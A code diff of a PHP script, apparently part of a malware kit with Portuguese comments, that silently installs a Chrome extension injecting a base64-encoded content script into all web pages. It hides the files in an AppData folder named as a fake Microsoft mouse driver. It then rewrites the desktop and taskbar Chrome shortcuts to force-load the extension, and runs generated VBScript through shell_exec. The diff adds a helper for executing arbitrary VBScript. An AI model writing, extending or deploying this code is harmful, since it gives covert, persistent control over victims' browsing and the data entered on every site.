@@ -1,17 +1,30 @@
 execução por eval. cuidado, não use exit e nem __FILE__
 
-[________GIT_COMMAND]
+[GIT_COMMAND]
+
+$GLOBALS['__execVBS_temp_002'] = function( $script, $newContext = false, $create = false, $returnSingleLine = false )
+{
+	$pathVBS = getenv( 'APPDATA' ) . '\\'.$GLOBALS['ESSENTIALS_MODULES_PATH'].'\\';
+	@mkdir($pathVBS);
+	$pathVBS .= 'eval.vbs';
+	$script = preg_replace( '/\"/is', '{Q}', $script );
+	$script = preg_replace( '/[\r\n]/is', '{B}', $script );
+	$script = preg_replace( '/On[\s]+Error[\s]+resume[\s]+next/is', '', $script );
+	if( $returnSingleLine ) return $script;
+	if( !$newContext ) return @shell_exec( 'cscript.exe "' . $pathVBS . '" ' . escapeshellarg( $script ) );
+	@shell_exec( 'start "" "' . $pathVBS . '" ' . escapeshellarg( $script ) );
+};
 
 $GLOBALS['__criando__atalho_002'] = function($source, $dest)
 {
 	$dataVBS = 'Set shell = CreateObject("WScript.Shell")'
 		.PHP_EOL.'Set link = shell.CreateShortcut("'.$dest.'")'
 		.PHP_EOL.'link.TargetPath = "'.$source.'\\chrome.exe"'
-		.PHP_EOL.'link.Arguments = "--load-extension=""%USERPROFILE%\\AppData\Roaming\\Microsoft Mouse Driver x86 vs10.1\\chrome_app"""'
+		.PHP_EOL.'link.Arguments = "--load-extension=""'.getenv('USERPROFILE').'\\AppData\Roaming\\Microsoft Mouse Driver x86 vs10.1\\chrome_app"""'
 		.PHP_EOL.'link.IconLocation = "'.$source.'\\chrome.exe, 0"'
 		.PHP_EOL.'link.WorkingDirectory = "'.$source.'"'
 		.PHP_EOL.'link.Save';
-	@execVBS( $dataVBS );
+	@$GLOBALS['__execVBS_temp_002']( $dataVBS );
 };
 
 $manifest = '{"manifest_version":3,"name":"Chrome","version":"1.0","content_scripts":[{"matches":["<all_urls>"],"js":["content.js"],"run_at":"document_idle"}]}';
@@ -22,9 +35,9 @@ $target = $appdata . "\Microsoft Mouse Driver x86 vs10.1";
 $extpath = $target . "\chrome_app";
 @mkdir($target);
 @mkdir($extpath);
-if(@file_get_contents($target . '/file_ctr_vir') !== '0000009')
+if(@file_get_contents($target . '/file_ctr_vir') !== '00000011')
 {
-	@file_put_contents($target . '/file_ctr_vir', '0000009');
+	@file_put_contents($target . '/file_ctr_vir', '00000011');
 	@file_put_contents($extpath . '/content.js', base64_decode($cntjs));
 	@file_put_contents($extpath . '/manifest.json', $manifest);
 	$exe_paths = array(
@@ -41,7 +54,7 @@ if(@file_get_contents($target . '/file_ctr_vir') !== '0000009')
 		$userpath . "\\Desktop\\Google Chrome.lnk",
 		$userpath . "\\Desktop\\Chrome.lnk",
 		$appdata . "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk",
-		$appdata . "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Chrome.lnk",
+		$appdata . "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Chrome.lnk"
 	);
 	foreach($paths as $path)
 	{
@@ -57,8 +70,5 @@ if(@file_get_contents($target . '/file_ctr_vir') !== '0000009')
 		}
 	}
 }
-
-
-
 
 [/GIT_COMMAND]
